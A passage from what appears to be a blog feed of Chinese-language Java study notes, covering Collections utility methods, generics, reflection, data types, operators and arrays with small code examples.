Collections.swap(<span class="hljs-built_in">array</span>List,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br>      System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>List);      <span class="hljs-comment">//[100, 200, 300, 600, 500, 400, 700, 800, 900]</span><br></code></pre></td></tr></table></figure><h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><ul><li><p>Object max &#x2F; min（Collection &#x2F; Collecton，Comparator）：根据顺序 &#x2F; 指定规则返回最大 &#x2F; 小元素</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">Object <span class="hljs-built_in">max</span>=Collections.<span class="hljs-built_in">max</span>(arrayList);<br><span class="hljs-keyword">System</span>.out.println(<span class="hljs-built_in">max</span>);<br></code></pre></td></tr></table></figure></li><li><p>int frequency ( collection,Object ) :返回指定元素出现个数</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> frequency=Collections.frequency(<span class="hljs-built_in">array</span>List,<span class="hljs-number">500</span>);<br>System.<span class="hljs-keyword">out</span>.println(frequency);<br></code></pre></td></tr></table></figure></li><li><p>void copy （List dest，List src）:将 src 内容复制到 dest 中</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">ArrayList <span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList=<span class="hljs-keyword">new</span> ArrayList(arrayList.size());<br>   <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; arrayList.size(); i++) &#123;<br>      <span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList.add(<span class="hljs-number">0</span>);  <br>   &#125;<br>  Collections.copy(<span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList,arrayList);<br>  System.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList);<br></code></pre></td></tr></table></figure></li><li><p>boolean replaceAll（List list，Object oldVal，Object newVal）：使用新值替换所有旧值</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">Collections.replaceAll(<span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList,<span class="hljs-number">200</span>,<span class="hljs-number">1000</span>);<br>System.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList);<br></code></pre></td></tr></table></figure></li></ul><h3 id="集合的使用和选择"><a href="#集合的使用和选择" class="headerlink" title="集合的使用和选择"></a>集合的使用和选择</h3><p><strong>判断需要存储数据类想</strong></p><ul><li>一组对象</li><li>一组键值对</li></ul><p><strong>一组对象（单列）：Collection 接口</strong></p><ul><li><p>允许重复：List</p><ul><li>增删多：LinkedList （底层是双向链表）</li><li>改查多：ArrayList（底层是 Object 类型的可变数组）</li></ul></li><li><p>不允许重复：Set</p><ul><li>无序：HashSet（底层是 HashMap，数组 + 链表 +红黑树）</li><li>排序：TreeSet</li><li>插入和取出顺序一致：LinkedHashSet（底层是数组 + 双向链表）</li></ul></li></ul><p><strong>一组键值对（双列）：Map 接口</strong></p><ul><li>键无序：HashMap（ 数组 + 链表 + 红黑树 ）</li><li>键排序：TreeMap</li><li>键插入和取出顺序一致：LinkedHashMap</li><li>读取文件：Properties</li></ul><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li><p>public class ArrayList&lt;E&gt;</p><p>………</p><p>&lt;E&gt;的 E 为泛型，随意表示</p></li><li><p>带一个或多个类型参数的类或接口</p></li></ul><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><ul><li>interface List&lt;T&gt;{ }</li><li>class HashMap&lt;K,V&gt;{ }</li><li>T、K、V 代表表示类型</li></ul><h2 id="泛型实例化"><a href="#泛型实例化" class="headerlink" title="泛型实例化"></a>泛型实例化</h2><ul><li>HashMap&lt;String，String&gt;   hashMap &#x3D; new HashMap&lt;&gt;( )；</li><li>Iterator&lt;Map.Entry&lt;String,String&gt;&gt;  iterator &#x3D; entries.iterator( )；</li></ul><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-built_in">HashMap</span> hashMap=<span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>();等价于 <span class="hljs-built_in">HashMap</span>&lt;<span class="hljs-built_in">Object</span>&gt; hashMap=<span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><h3 id="自定义泛型类"><a href="#自定义泛型类" class="headerlink" title="自定义泛型类"></a>自定义泛型类</h3><ul><li>不指定类型默认为 Object</li></ul><h3 id="自定义泛型接口"><a href="#自定义泛型接口" class="headerlink" title="自定义泛型接口"></a>自定义泛型接口</h3><ul><li>接口中静态成员不能使用泛型</li><li>类型在继承接口或类实现接口时确定</li></ul><h3 id="自定义泛型方法"><a href="#自定义泛型方法" class="headerlink" title="自定义泛型方法"></a>自定义泛型方法</h3><ul><li><p>带类型参数的方法</p></li><li><p>泛型方法可以定义在泛型和普通类里面。使用泛型的方法未定义泛型</p></li><li><p>可以使用自己声明的泛型，也可以使用类声明的泛型</p></li><li><p>在调用时会确定类型</p></li></ul><h3 id="泛型通配符-“-？”"><a href="#泛型通配符-“-？”" class="headerlink" title="泛型通配符 “ ？”"></a>泛型通配符 “ ？”</h3><ul><li><p>泛型没有继承</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">List&lt;<span class="hljs-built_in">Object</span>&gt; list=<span class="hljs-keyword">new</span> ArrayList&lt;<span class="hljs-built_in">String</span>&gt;();<br></code></pre></td></tr></table></figure></li><li><p><code>&lt;?&gt;</code> : 支持任意泛型类型，任何类型的 List 对象</p></li><li><p><code>&lt;? extends A&gt;</code> : 接受 A 或 A 的子类，规定上限</p></li><li><p><code>&lt;? super A&gt; </code>: A 类或 A 的父类，规定下限</p></li></ul><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><ul><li>在不修改源码时，控制程序，不知道类结构情况下获取类的结构信息</li><li>可以突破访问修饰符的限制</li></ul><h2 id="Class-类的方法"><a href="#Class-类的方法" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><table><thead><tr><th>方法名</th><th>作用描述</th></tr></thead><tbody><tr><td>getName</td><td>获取全类名</td></tr><tr><td>getSimpleName</td><td>获取简单类名</td></tr><tr><td>getSuperClass</td><td>以 Class 形式返回父类信息</td></tr><tr><td>getInterface</td><td>以 Class [ ] 形式返回接口信息</td></tr><tr><td>getFiled &#x2F; getFields</td><td>获取 public 修饰的字段，包含本类和父类</td></tr><tr><td>getDeclaredFiled &#x2F; getDeclaredFileds</td><td>获取本类所有字段</td></tr><tr><td>getMethod &#x2F; getMethods</td><td>获取 public 修饰的方法，包含本类和父类</td></tr><tr><td>getDeclaredMethod &#x2F; getDeclaredMethods</td><td>获取本类所有方法（包括私有）</td></tr><tr><td>getConstructors</td><td>获取本类 public 修饰的构造器</td></tr><tr><td>getDeclearedConstructors</td><td>获取本类所有构造器</td></tr><tr><td>getPackage</td><td>以 Package 形式返回包信息</td></tr><tr><td>getAnnotations</td><td>以 Annotation 形式返回注解信息</td></tr><tr><td>getClass</td><td>得到运行类型</td></tr><tr><td>newInstance</td><td>创建对象</td></tr><tr><td>getClassLoader</td><td>得到类加载器</td></tr><tr><td>forName</td><td>得到类对象</td></tr></tbody></table><h2 id="Class-类对象获取方式"><a href="#Class-类对象获取方式" class="headerlink" title="Class 类对象获取方式"></a>Class 类对象获取方式</h2><ul><li>Class.forName ( … )</li><li>类.class用于参数传递</li><li>对象.getClass ( )</li><li>ClassLoader.loadClass ( … )</li><li>基本数据类型的 Class 类对象获取   int.class    Integer.TYPE</li><li>基本数据类型的 Class 类对象获取    Integer.class</li></ul><h2 id="Class-类对象"><a href="#Class-类对象" class="headerlink" title="Class 类对象"></a>Class 类对象</h2><ul><li>外部类</li><li>成员内部类，静态内部类，局部内部类，匿名内部类</li><li>interface：接口</li><li>数组</li><li>enum：枚举     Thread.State</li><li>annotation：注解</li><li>基本数据类型</li><li>void</li></ul><h2 id="Class-类的方法-1"><a href="#Class-类的方法-1" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><p>反射创造对象</p><ul><li>无参构造器</li><li>有参构造器</li><li>私有构造器</li></ul><p>反射操作属性</p><ul><li>获取属性</li><li>设置属性</li><li>私有属性</li><li>如果是静态属性，第一个参数可以给 null</li></ul><p>反射操作方法</p><ul><li>获取方法<ul><li>getMethod</li></ul></li></ul><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>java . lang . reflect .Filed 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getType：以 Class 形式返回类型</li><li>getName：返回属性名</li></ul><p>java . lang . reflect . Method 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getReturnType：以 Class 形式获取返回类型</li><li>getName：返回方法名</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li></ul><p>java . lang . reflect . Constructor 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getName：返回构造器名（全类名）</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li><li>newInstance</li></ul><p>差不多就到这了，笔记比较简洁，里面有很多很简单的东西没写，本来想一篇搞完的，但是好像有几w字了，可能有字数限制，后面部分传上来全乱了呜呜呜呜呜，只能分成两篇了……</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 基础</title>
    <link href="/2024/11/09/Java/"/>
    <url>/2024/11/09/Java/</url>
    
    <content type="html"><![CDATA[<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="八大数据类型"><a href="#八大数据类型" class="headerlink" title="八大数据类型"></a>八大数据类型</h2><h6 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h6><p>​1.整数类型（byte,short,int,long）</p><p>​2.浮点类型（float,double）</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">long num <span class="hljs-operator">=</span><span class="hljs-number">30</span>L<span class="hljs-comment">;// long 型加 L</span><br>float num1 <span class="hljs-operator">=</span> <span class="hljs-number">50.1</span>F<span class="hljs-comment">;// float 型加 F</span><br></code></pre></td></tr></table></figure><h6 id="字符型（char）2个字节"><a href="#字符型（char）2个字节" class="headerlink" title="字符型（char）2个字节"></a>字符型（char）2个字节</h6><h6 id="布尔型（boolean）"><a href="#布尔型（boolean）" class="headerlink" title="布尔型（boolean）"></a>布尔型（boolean）</h6><h2 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h2><p>类（class） </p><p>接口（interface）</p><p>数组（[]）</p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>＋-作为单元运算符存在时，表示正负</p><p>1.＋</p><p>＋左右两边没有字符串，则进行数值运算。</p><p>＋左右两边有字符串，进行字符串拼接，如果不是字符串会<strong>转换成字符串</strong>。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">System</span>.out.println(<span class="hljs-number">100</span>+<span class="hljs-number">98</span>);//<span class="hljs-number">198</span><br><span class="hljs-attribute">System</span>.out.println(&#x27;a&#x27;+<span class="hljs-number">1</span>);//<span class="hljs-number">98</span><br><span class="hljs-attribute">System</span>.out.println(<span class="hljs-string">&quot;a&quot;</span>+<span class="hljs-number">1</span>+<span class="hljs-number">3</span>);//a13<br><span class="hljs-attribute">System</span>.out.println(<span class="hljs-number">1</span>+<span class="hljs-number">3</span>+<span class="hljs-string">&quot;a&quot;</span>);//<span class="hljs-number">4</span>a<br></code></pre></td></tr></table></figure><p>2.%</p><p><strong>a%b=&#x3D;a-a&#x2F;b*b</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">System</span>.out.println(<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);//<span class="hljs-number">2</span><br><span class="hljs-attribute">System</span>.out.println(-<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);          //-<span class="hljs-number">2</span><br><span class="hljs-attribute">System</span>.out.println(<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);//<span class="hljs-number">2</span><br><span class="hljs-attribute">System</span>.out.println(-<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);//-<span class="hljs-number">2</span> <br></code></pre></td></tr></table></figure><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>&amp; 和|不管真假都运算</p><p>HEX编码</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><h3 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h3><p>​元素类型[ ]  数组名&#x3D; new 元素类型[数组长度]；</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">int</span>[]  arr=<span class="hljs-keyword">new</span>  <span class="hljs-type">int</span>[<span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><h3 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h3><p>元素类型[ ]  数组名&#x3D;new 元素类型[ ]{元素，元素，元素…};</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span>[]  arr=new int[ ]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><span class="hljs-attribute">int</span>[] arr=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><p>相当于 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span>[] arr=new int[<span class="hljs-number">5</span>];<br><span class="hljs-attribute">arr</span>[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,arr[<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>,arr[<span class="hljs-number">2</span>]=<span class="hljs-number">3</span>,arr[<span class="hljs-number">3</span>]=<span class="hljs-number">4</span>,arr[<span class="hljs-number">4</span>]=<span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>e.g</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br><span class="hljs-type">char</span> chars1[]=<span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[]&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br></code></pre></td></tr></table></figure><h3 id="数组创建后没有赋值就是默认值"><a href="#数组创建后没有赋值就是默认值" class="headerlink" title="数组创建后没有赋值就是默认值"></a>数组创建后没有赋值就是默认值</h3><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-type">long</span>/<span class="hljs-type">int</span>/<span class="hljs-type">short</span>/<span class="hljs-type">byte</span> <span class="hljs-number">0</span><br><br><span class="hljs-type">float</span>/<span class="hljs-type">double</span> <span class="hljs-number">0.0</span><br><br><span class="hljs-type">boolean</span> <span class="hljs-literal">false</span><br><br><span class="hljs-built_in">String</span> <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h3 id="数组使用步骤"><a href="#数组使用步骤" class="headerlink" title="数组使用步骤"></a>数组使用步骤</h3><p>声明数组-&gt;开辟空间-&gt;给数组各个元素赋值-&gt;使用数组</p><h3 id="数组成员的赋值和读取"><a href="#数组成员的赋值和读取" class="headerlink" title="数组成员的赋值和读取"></a>数组成员的赋值和读取</h3><h3 id="下标越界会抛异常"><a href="#下标越界会抛异常" class="headerlink" title="下标越界会抛异常"></a>下标越界会抛异常</h3><p><strong>数组下标越界异常</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span>[] arr=new int[<span class="hljs-number">3</span>];<br><span class="hljs-attribute">System</span>.out.println(arr[<span class="hljs-number">3</span>]);//有效下标为<span class="hljs-number">0</span>，<span class="hljs-number">1</span>，<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>空指针异常</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int[] arr<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h3><p><strong>数组名.length</strong>获取数组长度</p><p>数组扩容</p><h3 id="值传递与引用传递"><a href="#值传递与引用传递" class="headerlink" title="值传递与引用传递"></a>值传递与引用传递</h3><h4 id="a-栈内存"><a href="#a-栈内存" class="headerlink" title="a.栈内存"></a>a.栈内存</h4><p>​存储局部变量，离开作用域，自动释放</p><h4 id="b-堆内存"><a href="#b-堆内存" class="headerlink" title="b.堆内存"></a>b.堆内存</h4><p>​数组和对象，通过 new 建立的实例都放在堆内存中</p><p>​当没有任何引用指向实例的时候，gc 会不定时回收</p><p>​实例中的变量都有默认初始化值，建议手动初始化</p><p>​引用类型的初始化为 null</p><h4 id="c-方法区、本地方法区"><a href="#c-方法区、本地方法区" class="headerlink" title="c.方法区、本地方法区"></a>c.方法区、本地方法区</h4><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><h3 id="二维数组定义和长度"><a href="#二维数组定义和长度" class="headerlink" title="二维数组定义和长度"></a>二维数组定义和长度</h3><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs inform7">&#123;<br>&#123;1，2，3&#125;，<br>&#123;4，5，6&#125;<br>&#125;<br>int<span class="hljs-comment">[]</span><span class="hljs-comment">[]</span> arr=new int<span class="hljs-comment">[2]</span><span class="hljs-comment">[3]</span>;<br>arr<span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span>=100;<br>System.out.println(arr.length); //2，二维数组长度<br>System.out.println(arr<span class="hljs-comment">[0]</span>.length);<br>System.out.println(arr<span class="hljs-comment">[1]</span>.length);//3，个数<br><br><br><br>&#123;<br>&#123;0,0&#125;,<br>&#123;0,0,0&#125;<br>&#125;<br>int<span class="hljs-comment">[]</span><span class="hljs-comment">[]</span> arr2=new int<span class="hljs-comment">[2]</span><span class="hljs-comment">[]</span>;//先开辟空间，2行，再继续取列数<br>arr2<span class="hljs-comment">[0]</span>=new int<span class="hljs-comment">[2]</span>;<br>arr2<span class="hljs-comment">[1]</span>=new int<span class="hljs-comment">[3]</span>;<br><br><br><br>int<span class="hljs-comment">[]</span><span class="hljs-comment">[]</span> arr3=&#123;<br>&#123;1,2,3&#125;,<br>&#123;4,5,6&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二维数组其他定义方式"><a href="#二维数组其他定义方式" class="headerlink" title="二维数组其他定义方式"></a>二维数组其他定义方式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">int<span class="hljs-selector-attr">[]</span> <span class="hljs-attribute">x</span>;int <span class="hljs-attribute">x</span><span class="hljs-selector-attr">[]</span>;<br>int<span class="hljs-selector-attr">[]</span><span class="hljs-selector-attr">[]</span> <span class="hljs-attribute">y</span>;int <span class="hljs-attribute">y</span><span class="hljs-selector-attr">[]</span><span class="hljs-selector-attr">[]</span>;int <span class="hljs-selector-attr">[]</span> <span class="hljs-attribute">y</span><span class="hljs-selector-attr">[]</span>;<br></code></pre></td></tr></table></figure><p>e.g.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span><br>String foo=&quot;blue&quot;;<br>        <span class="hljs-type">boolean</span>[] bar=<span class="hljs-built_in">new</span> <span class="hljs-type">boolean</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span>(bar[<span class="hljs-number">0</span>])&#123;<br>            foo=&quot;green&quot;;<br>        &#125;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(foo);<br>//输出blue<br><span class="hljs-number">2.</span><br><span class="hljs-type">char</span>[] arr1 = &#123;<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>&#125;;<br>        <span class="hljs-type">char</span>[] arr2 = arr1;<br>        arr2[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;x&#x27;</span>;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(arr1[<span class="hljs-number">2</span>]);<br>//输出x<br><span class="hljs-number">3.</span><br>随机生成十个整数<br><span class="hljs-type">int</span>[] arr=<span class="hljs-built_in">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            arr[i]=(<span class="hljs-type">int</span>)(Math.random()*<span class="hljs-number">100</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(arr[i]);<br>        &#125;<br>//倒序打印<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=arr.length<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i<span class="hljs-comment">--)&#123;</span><br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(arr[i]);<br>        &#125;<br>//求均值<br>        <span class="hljs-type">int</span> sum=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;arr.length;i++)&#123;<br>            sum +=arr[i];<br>        &#125;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;均值&quot;+sum/arr.length);<br>//求最大值及其索引<br>        <span class="hljs-type">int</span> max=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> maxIndex=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            <span class="hljs-keyword">if</span>(max&lt;arr[i])&#123;<br>                max=arr[i];<br>                maxIndex=i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(max+&quot; &quot;+maxIndex);<br></code></pre></td></tr></table></figure><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-type">int</span> a=<span class="hljs-number">164</span>;<br>      StringBuilder stringBuilder=<span class="hljs-built_in">new</span> StringBuilder();<br>      <span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>&#125;;<br>      <span class="hljs-keyword">while</span>(a&gt;<span class="hljs-number">0</span>)&#123;<br>          <span class="hljs-type">int</span> <span class="hljs-keyword">index</span>=a%<span class="hljs-number">16</span>;<br>          <span class="hljs-type">char</span> <span class="hljs-keyword">temp</span>=chars[<span class="hljs-keyword">index</span>];<br>          stringBuilder.append(<span class="hljs-keyword">temp</span>);<br>          a=a/<span class="hljs-number">16</span>;<br>      &#125;<br>      <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(stringBuilder.reverse().toString());<br><br></code></pre></td></tr></table></figure><h1 id="类、属性、对象"><a href="#类、属性、对象" class="headerlink" title="类、属性、对象"></a>类、属性、对象</h1><h2 id="类的定义方法"><a href="#类的定义方法" class="headerlink" title="类的定义方法"></a>类的定义方法</h2><h3 id="方法（函数-成员方法-method-）的定义"><a href="#方法（函数-成员方法-method-）的定义" class="headerlink" title="方法（函数&#x2F;成员方法&#x2F; method ）的定义"></a>方法（函数&#x2F;成员方法&#x2F; method ）的定义</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs typescript">访问修饰符 返回值类型 